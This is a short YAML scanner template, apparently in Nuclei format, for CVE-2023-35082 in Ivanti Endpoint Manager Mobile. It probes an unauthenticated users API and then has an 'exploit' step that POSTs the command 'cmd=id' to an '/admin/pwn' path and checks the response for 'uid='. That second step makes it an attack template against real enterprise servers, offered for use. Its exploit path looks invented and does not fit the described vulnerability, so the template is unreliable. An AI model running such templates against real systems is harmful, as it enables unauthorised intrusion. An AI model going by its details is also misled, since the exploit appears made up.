id: cve-2023-35082
info:
  name: Ivanti EPMM Remote Code Execution
  author: FerzDevZ
  severity: critical
  description: Remote code execution in Ivanti Endpoint Manager Mobile (EPMM) via API.
requests:
  - method: GET
    path:
      - "/mifs/aad/api/v2/authorized/users"
    matchers:
      - type: status
        status: [200]
exploit:
  steps:
    - method: POST
      path: "/mifs/aad/api/v2/authorized/users/admin/pwn"
      body: "cmd=id"
      matchers:
        - type: word
          words: ["uid="]
